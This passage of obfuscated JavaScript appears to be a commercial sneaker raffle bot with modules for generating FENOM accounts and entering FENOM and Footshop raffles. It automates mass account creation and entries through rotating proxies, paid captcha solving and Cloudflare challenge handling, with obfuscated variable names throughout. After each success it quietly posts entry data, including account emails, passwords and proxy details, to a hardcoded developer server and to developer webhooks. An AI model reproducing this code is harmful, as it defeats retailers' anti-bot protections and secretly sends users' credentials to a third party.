                            _0x11b25c['errorDEV'] = { 'embeds': [_0x30d13e] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x11b25c['errorDEV']), await _0x471d59(_0x32fdb9, _0x11b25c['errorDEV']), _0x1be791 = 'yes';
                        } finally {
                            _0x1e4f32 && _0x1e4f32['close']();
                            if (_0x1be791 == 'yes' && _0x20f662 != 0x5) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x1d6cdc['name'] + ']\x20Task\x20' + (_0x4116a8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x20f662 + '\x20/\x205)')), _0x4116a8 = _0x4116a8 - 0x1, _0x20f662 = _0x20f662 + 0x1;
                                continue;
                            }
                            _0x1be791 == 'yes' && _0x20f662 >= 0x5 && (_0x12ac99(_0x381534[_0x4116a8], _0x1d6cdc), _0x1be791 = 'no', _0x20f662 = 0x0), console['log']('Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x5c985a, _0x465f83, _0xf2c6f2) {
                    var _0x5f334c = _0x465f83, _0x134457 = 0x0;
                    for (var _0x446e16 = 0x0; _0x446e16 < _0x465f83['length']; _0x446e16++) {
                        maxTasks = Number(_0x6a12f3['threads']);
                        while (_0x134457 >= maxTasks) {
                            await _0x1d2efb(_0x6a12f3['delay']);
                        }
                        let _0x5688ed = ![];
                        async function _0x49e6fc(_0x52ee12, _0x228aac, _0x11be0c, _0x3bafcb, _0x30573c) {
                            _0x134457++, _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x6a12f3['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x85e9b1 != 'yes')
                                var _0x85e9b1 = '', _0x30573c = 0x0;
                            var _0x44b574;
                            try {
                                await _0x3cf8c0(_0x228aac, _0x3bafcb);
                            } catch {
                                _0x85e9b1 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0xd208b3(_0x52ee12['name'] + '\x20Task\x20' + (_0x3bafcb + 0x1) + '\x20/\x20' + _0x228aac['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                            var _0x4c91ee = await _0x3aa619(_0x228aac[_0x3bafcb], _0x52ee12, 'acc', ![]);
                            const _0x322f0c = { 'succesDEVMSG': { 'embeds': [_0x4c91ee] } }, _0x497f66 = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x13610d = Math['round'](Math['random']() * (_0x11be0c['length'] - 0x1)), _0x1fbcb8 = _0x11be0c[_0x13610d]['split'](':'), _0x2ad7e8;
                            async function _0x5203da(_0x62ddd2) {
                                const _0x389883 = _0x3601e1['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x5b7e66 = _0x199bc3['parse'](_0x389883, { 'header': !![] })['data'];
                                let _0x108739 = ![];
                                for (var _0x1634df of _0x5b7e66) {
                                    if (_0x1634df['Email'] == _0x62ddd2['Email']) {
                                        _0x108739 = !![];
                                        break;
                                    }
                                }
                                return _0x108739;
                            }
                            try {
                                if (await _0x5203da(_0x228aac[_0x3bafcb]) == !![]) {
                                    console['log'](_0x24cf02() + '\x20[' + _0x52ee12['name'] + ']\x20Task\x20' + (_0x3bafcb + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x5688ed = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x2ad7e8 = await _0xd499ac['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x1fbcb8[0x0] + ':' + _0x1fbcb8[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x2ad7e8 = await _0xd499ac['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x1fbcb8[0x0] + ':' + _0x1fbcb8[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x26f428 = await _0x2ad7e8['newPage']();
                                await _0x26f428['setViewport']({
                                    'width': 0x500 + _0x4d5bf6(0x1, 0x32),
                                    'height': 0x2d9 + _0x4d5bf6(0x1, 0x32)
                                });
                                const _0x406270 = await _0x26f428['target']()['createCDPSession'](), { windowId: _0x38eaa6 } = await _0x406270['send']('Browser.getWindowForTarget');
                                await _0x26f428['authenticate']({
                                    'username': '' + _0x1fbcb8[0x2],
                                    'password': '' + _0x1fbcb8[0x3]
                                }), console['log'](_0x24cf02() + '\x20[' + _0x52ee12['name'] + ']\x20Task\x20' + (_0x3bafcb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x26f428['goto']('' + _0x497f66, { 'waitUntil': 'networkidle2' }), console['log'](_0x24cf02() + '\x20[' + _0x52ee12['name'] + ']\x20Task\x20' + (_0x3bafcb + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1d2efb(0x1388);
                                var _0x1a04f9 = await _0x26f428['$']('.hcaptcha-box');
                                if (_0x1a04f9) {
                                    console['log'](_0x24cf02() + '\x20[' + _0x52ee12['name'] + ']\x20Task\x20' + (_0x3bafcb + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x1d2efb(0x2710);
                                    const _0x37511b = await _0x26f428['$']('.hcaptcha-box');
                                    if (_0x37511b)
                                        try {
                                            await _0x37511b['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x26f428['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x20fe40 = await _0x26f428['$']('.hcaptcha-box');
                                        if (_0x20fe40)
                                            try {
                                                await _0x20fe40['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x26f428['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x406270['send']('Browser.setWindowBounds', {
                                        'windowId': _0x38eaa6,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x1d2efb(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x24cf02() + '\x20[' + _0x52ee12['name'] + ']\x20Task\x20' + (_0x3bafcb + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x26f428['type']('input[name=\x22firstname\x22]', '' + _0x228aac[_0x3bafcb]['FirstName']), await _0x1d2efb(0x1f4), await _0x26f428['type']('input[name=\x22lastname\x22]', '' + _0x228aac[_0x3bafcb]['LastName']), await _0x1d2efb(0x1f4), await _0x26f428['type']('input[name=\x22email\x22]', '' + _0x228aac[_0x3bafcb]['Email']), await _0x1d2efb(0x1f4), await _0x26f428['type']('input[name=\x22password\x22]', '' + _0x228aac[_0x3bafcb]['Password']), await _0x1d2efb(0x258), await _0x26f428['$eval']('input[name=\x22psgdpr\x22]', _0x4e3b43 => _0x4e3b43['click']()), await _0x1d2efb(0x1f4), console['log'](_0x24cf02() + '\x20[' + _0x52ee12['name'] + ']\x20Task\x20' + (_0x3bafcb + 0x1) + '\x20:\x20Sending\x20Request'), await _0x26f428['$eval']('#customer-form', _0x462528 => _0x462528['submit']());
                                try {
                                    try {
                                        await _0x26f428['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x85e9b1 = 'no', console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0x52ee12['name'] + ']\x20Task\x20' + (_0x3bafcb + 0x1) + '\x20:\x20Account\x20' + _0x228aac[_0x3bafcb]['Email'] + '\x20Generated')), _0x3601e1['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x228aac[_0x3bafcb]['Email'] + ',' + _0x228aac[_0x3bafcb]['Password']);
                                    let _0x301e9e = _0x228aac[_0x3bafcb];
                                    try {
                                        prxdata = {
                                            'username': _0x3919f0['replace']('#', ''),
                                            'module': _0x52ee12['name'],
                                            'entrydata': JSON['stringify'](_0x301e9e),
                                            'proxy': '' + _0x11be0c[_0x3bafcb]
                                        };
                                        var _0x66716f = JSON['stringify'](prxdata);
                                        let _0x33f938 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x66716f, _0x33f938);
                                    } catch (_0x6d3f35) {
                                    }
                                    try {
                                        _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x322f0c['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x471d59(_0x70ae37, _0x322f0c['succesDEVMSG']);
                                } catch (_0x4d9484) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x184fcd) {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x52ee12['name'] + ']\x20Task\x20' + (_0x3bafcb + 0x1) + '\x20:\x20' + _0x184fcd)), _0x44b574 = '' + _0x184fcd;
                                var _0x26d6c2 = await _0x3aa619(_0x228aac[_0x3bafcb], _0x52ee12, 'acc', !![], _0x44b574);
                                _0x322f0c['errorDEV'] = { 'embeds': [_0x26d6c2] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x322f0c['errorDEV']), await _0x471d59(_0x32fdb9, _0x322f0c['errorDEV']), _0x85e9b1 = 'yes';
                            } finally {
                                _0x2ad7e8 && _0x2ad7e8['close']();
                                if (_0x85e9b1 == 'yes' && _0x30573c != 0x5)
                                    return console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0x52ee12['name'] + ']\x20Task\x20' + (_0x3bafcb + 0x1) + '\x20:\x20Retrying\x20(' + _0x30573c + '\x20/\x205)')), _0x30573c = _0x30573c + 0x1, _0x134457--, _0x49e6fc(_0x52ee12, _0x228aac, _0x11be0c, _0x3bafcb, _0x30573c);
                                _0x85e9b1 == 'yes' && _0x30573c >= 0x5 && _0x12ac99(_0x228aac[_0x3bafcb], _0x52ee12), !_0x5688ed && (console['log'](_0x24cf02() + '\x20[' + _0x52ee12['name'] + ']\x20Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay'])), _0x134457--;
                            }
                        }
                        _0x49e6fc(_0x5c985a, _0x5f334c, _0xf2c6f2, _0x446e16), !_0x5688ed && await _0x1d2efb(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x4c82a2(_0xba3e9a, _0x4678f3, _0x41b6b5) {
                    _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x6a12f3['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5565d2 = 0x0; _0x5565d2 < _0x4678f3['length']; _0x5565d2++) {
                        if (_0x5e2a97 != 'yes')
                            var _0x5e2a97 = '', _0x15f676 = 0x0;
                        var _0x540739;
                        try {
                            await _0x3cf8c0(_0x4678f3, _0x5565d2);
                        } catch {
                            _0x5e2a97 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0xd208b3(_0xba3e9a['name'] + '\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20/\x20' + _0x4678f3['length'] + '\x20||\x20File:\x20' + _0x33ba4e + '\x20Proxies:\x20' + _0x53dc6d);
                        const _0x3858ac = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x2ab3f7 = Math['round'](Math['random']() * (_0x41b6b5['length'] - 0x1)), _0x402a3d = _0x41b6b5[_0x2ab3f7]['split'](':'), _0x51acb7;
                        try {
                            _0x51acb7 = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x402a3d[0x0] + ':' + _0x402a3d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x51acb7 = await _0xd499ac['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x402a3d[0x0] + ':' + _0x402a3d[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x28645c = await _0x51acb7['newPage'](), _0x3be7bd = await _0x28645c['target']()['createCDPSession'](), { windowId: _0x4b9990 } = await _0x3be7bd['send']('Browser.getWindowForTarget');
                            await _0x28645c['authenticate']({
                                'username': '' + _0x402a3d[0x2],
                                'password': '' + _0x402a3d[0x3]
                            }), console['log'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x28645c['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1d2efb(0x1388);
                            var _0x27e14b = await _0x28645c['$']('.hcaptcha-box');
                            if (_0x27e14b) {
                                console['log'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x1d2efb(0x2710);
                                const _0x32f7a0 = await _0x28645c['$']('.hcaptcha-box');
                                if (_0x32f7a0)
                                    try {
                                        await _0x32f7a0['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x28645c['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x3f48cd = await _0x28645c['$']('.hcaptcha-box');
                                    if (_0x3f48cd)
                                        try {
                                            await _0x3f48cd['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x3be7bd['send']('Browser.setWindowBounds', {
                                'windowId': _0x4b9990,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x1d2efb(0x1f40);
                            try {
                                await _0x28645c['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x1d2efb(0x1388), console['log'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20:\x20Logging\x20in'), await _0x28645c['type']('input[name=\x22email\x22]', '' + _0x4678f3[_0x5565d2]['Email']), await _0x1d2efb(0x1f4), await _0x28645c['type']('input[name=\x22password\x22]', '' + _0x4678f3[_0x5565d2]['Password']), await _0x1d2efb(0x258), await _0x28645c['$eval']('#login-form', _0x30d05b => _0x30d05b['submit']()), await _0x28645c['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x1d2efb(0x1f4), await _0x28645c['goto']('' + _0x4678f3[_0x5565d2]['Url']), await _0x28645c['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4678f3[_0x5565d2]['Size']);
                            if (_0x4678f3[_0x5565d2]['Size'] != 'RANDOM') {
                                var _0x1a4d09 = '\x20' + _0x4678f3[_0x5565d2]['Size'] + '\x20';
                                const _0x26edcf = await _0x28645c['$x']('//span[contains(text(),\x20' + _0x1a4d09 + ')]');
                                await _0x26edcf[0x0]['click']();
                            } else {
                                const _0x2815b1 = await _0x28645c['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x5caef0 = Math['round'](Math['random']() * (_0x2815b1['length'] - 0x1));
                                await _0x2815b1[_0x5caef0]['click']();
                            }
                            await _0x1d2efb(0x258), await _0x28645c['click']('#cookieChoiceDismiss'), await _0x1d2efb(0x3e8), await _0x28645c['type']('#instagram-account', '' + _0x4678f3[_0x5565d2]['Follower']), await _0x1d2efb(0x28a), await _0x28645c['click']('#book-btn'), await _0x1d2efb(0xbb8);
                            try {
                                await _0x28645c['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x1d2efb(0x1f4), console['log'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20:\x20' + _0x1b5f76['cyan']('Solving\x20Captcha')), await _0x28645c['solveRecaptchas'](), console['log'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x1d2efb(0x7d0), await _0x28645c['$eval']('#book-btn-for-sure', _0x4fdea0 => _0x4fdea0['click']()), await _0x1d2efb(0x12c), await _0x28645c['click']('#book-btn-for-sure'), await _0x1d2efb(0xdac);
                            const _0x1d21e8 = await _0x28645c['$eval']('.reservation-popup\x20>\x20.title', _0x17707f => {
                                return _0x17707f['innerHTML'];
                            });
                            if (_0x1d21e8) {
                                _0x5e2a97 = 'no', _0x21396e(_0x4678f3[_0x5565d2], _0xba3e9a), console['log'](_0x1b5f76['green'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x4a8fe5 = await _0x3aa619(_0x4678f3[_0x5565d2], _0xba3e9a, 'dev', ![]), _0x15f126 = await _0x3aa619(_0x4678f3[_0x5565d2], _0xba3e9a, 'pub', ![]);
                                let _0x422b53 = _0x4678f3[_0x5565d2];
                                try {
                                    prxdata = {
                                        'username': _0x3919f0['replace']('#', ''),
                                        'module': _0xba3e9a['name'],
                                        'entrydata': JSON['stringify'](_0x422b53),
                                        'proxy': '' + _0x41b6b5[_0x5565d2]
                                    };
                                    var _0x11d743 = JSON['stringify'](prxdata);
                                    let _0x210ed1 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2c145d['post']('https://jraffles.herokuapp.com/success', _0x11d743, _0x210ed1);
                                } catch (_0xa5f4cc) {
                                }
                                const _0x2c37ec = {
                                    'succesDEVMSG': { 'embeds': [_0x4a8fe5] },
                                    'succesPUBMSG': { 'embeds': [_0x15f126] }
                                };
                                try {
                                    _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x2c37ec['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x105382, _0x2c37ec['succesDEVMSG']), await _0x1d2efb(0xc8), await _0x471d59(_0x1d6d5c, _0x2c37ec['succesPUBMSG']);
                                } catch (_0x1790cb) {
                                    console['log'](_0x1b5f76['yellow'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1790cb));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x4d5936) {
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20:\x20' + _0x4d5936)), _0x540739 = '' + _0x4d5936;
                            var _0x5928e2 = await _0x3aa619(_0x4678f3[_0x5565d2], _0xba3e9a, 'dev', !![], _0x540739), _0x4a8fe5 = await _0x3aa619(_0x4678f3[_0x5565d2], _0xba3e9a, 'dev', ![]), _0x15f126 = await _0x3aa619(_0x4678f3[_0x5565d2], _0xba3e9a, 'pub', ![]);
                            const _0x5f4d6f = {
                                'succesDEVMSG': { 'embeds': [_0x4a8fe5] },
                                'succesPUBMSG': { 'embeds': [_0x15f126] }
                            };
                            _0x5f4d6f['errorDEV'] = { 'embeds': [_0x5928e2] }, _0x6a12f3['webhook'] != undefined && _0x6a12f3['webhook'] != '' && await _0x471d59(_0x6a12f3['webhook'], _0x5f4d6f['errorDEV']), await _0x471d59(_0x32fdb9, _0x5f4d6f['errorDEV']), _0x4d5936 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x5e2a97 = 'yes');
                        } finally {
                            _0x51acb7['close']();
                            if (_0x5e2a97 == 'yes' && _0x15f676 != 0x5 && _0x540739 != 'Size\x20Not\x20Found') {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Task\x20' + (_0x5565d2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x15f676 + '\x20/\x205)')), _0x5565d2 = _0x5565d2 - 0x1, _0x15f676 = _0x15f676 + 0x1;
                                continue;
                            }
                            _0x5e2a97 == 'yes' && _0x15f676 >= 0x5 && (_0x12ac99(_0x4678f3[_0x5565d2], _0xba3e9a), _0x5e2a97 = 'no', _0x15f676 = 0x0), console['log'](_0x24cf02() + '\x20[' + _0xba3e9a['name'] + ']\x20Waiting\x20for\x20' + _0x6a12f3['delay'] + '\x20ms'), await _0x1d2efb(_0x6a12f3['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0xc8276a, _0x645c58, _0x3c1f19) {
                _0xd499ac['use'](_0x3295ba()), _0xd499ac['use'](_0x288308({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x6a12f3['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x54f293 = 0x0; _0x54f293 < _0x645c58['length']; _0x54f293++) {
                    var _0x2680e7;
                    if (_0x4dddba != 'yes')
                        var _0x4dddba = '', _0x5ecd = 0x0;
                    var _0x1d38c7 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x3919f0
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x645c58[_0x54f293]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x645c58[_0x54f293]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x6a12f3['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x5696e3
                            }
                        ]
                    }], _0x231c63 = await _0x3aa619(_0x645c58[_0x54f293], _0xc8276a, 'dev', ![]), _0x5adf1a = await _0x3aa619(_0x645c58[_0x54f293], _0xc8276a, 'pub', ![]);
                    const _0x282ce2 = {
                        'succesDEVMSG': { 'embeds': [_0x231c63] },
                        'succesPUBMSG': { 'embeds': [_0x5adf1a] }
                    }, _0x1a41f5 = { 'embeds': _0x1d38c7 };
                    try {
                        await _0x3cf8c0(_0x645c58, _0x54f293);
                    } catch {
                        _0x4dddba = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x645c58[_0x54f293]['Email'] == '' || _0x645c58[_0x54f293]['FirstName'] == '' || _0x645c58[_0x54f293]['LastName'] == '' || _0x645c58[_0x54f293]['Country'] == '' || _0x645c58[_0x54f293]['Size'] == '' || _0x645c58[_0x54f293]['Address1'] == '' || _0x645c58[_0x54f293]['Zip'] == '') {
                        console['log'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x645c58[_0x54f293]['Email'] == '' || _0x645c58[_0x54f293]['FirstName'] == '' || _0x645c58[_0x54f293]['LastName'] == '' || _0x645c58[_0x54f293]['Country'] == '' || _0x645c58[_0x54f293]['Size'] == '' || _0x645c58[_0x54f293]['Address1'] == '' || _0x645c58[_0x54f293]['Zip'] == '' || _0x645c58[_0x54f293]['Phone'] == '') {
                        console['log'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x3ad2d8 = '' + _0x645c58[_0x54f293]['Url'];
                    if (_0x6a12f3['useRandomProxy'] = ![])
                        var _0x319e9e = _0x3c1f19[_0x54f293]['split'](':');
                    else
                        var _0x2dbaec = Math['round'](Math['random']() * (_0x3c1f19['length'] - 0x1)), _0x319e9e = _0x3c1f19[_0x2dbaec]['split'](':');
                    var _0x52a83a;
                    try {
                        _0x52a83a = await _0xd499ac['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x319e9e[0x0] + ':' + _0x319e9e[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x52a83a = await _0xd499ac['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x319e9e[0x0] + ':' + _0x319e9e[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x156e87 = await _0x52a83a['newPage']();
                        await _0x156e87['authenticate']({
                            'username': '' + _0x319e9e[0x2],
                            'password': '' + _0x319e9e[0x3]
                        }), console['log'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x156e87['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x156e87['setRequestInterception'](!![]), _0x156e87['on']('request', _0x5254fa => {
                            _0x5254fa['resourceType']() === 'image' || _0x5254fa['resourceType']() === 'font' || _0x5254fa['resourceType']() === 'media' ? _0x5254fa['abort']() : _0x5254fa['continue']();
                        });
                        try {
                            await _0x156e87['goto'](_0x3ad2d8), await _0x1d2efb(0xbb8), await _0x156e87['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x156e87['click']('.control__JhutY'), await _0x1d2efb(0x1f4);
                        if (_0x645c58[_0x54f293]['Size'] != 'RANDOM')
                            try {
                                const _0x380cc1 = await _0x156e87['$x']('//div[contains(text(),\x20\x27' + _0x645c58[_0x54f293]['Size'] + '\x27)]');
                                await _0x380cc1[0x0]['click']();
                            } catch {
                                console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x3df47e = await _0x156e87['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x216e78 = Math['round'](Math['random']() * (_0x3df47e['length'] - 0x1));
                            await _0x3df47e[_0x216e78]['click']();
                        }
                        await _0x1d2efb(0x4b0);
                        const _0x4fbe8a = await _0x156e87['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x4fbe8a[0x0]['click'](), await _0x156e87['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x156e87['type']('input[name=\x22email\x22]', '' + _0x645c58[_0x54f293]['Email']), await _0x1d2efb(0x640), await _0x156e87['type']('input[name=\x22phone\x22]', '' + _0x645c58[_0x54f293]['Phone']), await _0x1d2efb(0x4b0), await _0x156e87['click']('button.btn.continue-button__1RtsS'), await _0x1d2efb(0x4b0);
                        try {
                            await _0x156e87['type']('input[name=\x22firstName\x22]', '' + _0x645c58[_0x54f293]['FirstName']), await _0x1d2efb(0x258);
                        } catch {
                            const _0x56dbc3 = await _0x156e87['$$eval']('.invalid-feedback\x20>\x20div', _0x5e3c2e => {
                                return _0x5e3c2e['map'](_0x2b6468 => _0x2b6468['innerText']);
                            });
                            console['log'](_0x1b5f76['red'](_0x24cf02() + '\x20[' + _0xc8276a['name'] + ']\x20Task\x20' + (_0x54f293 + 0x1) + '\x20:\x20' + _0x56dbc3));
                            continue;
                        }
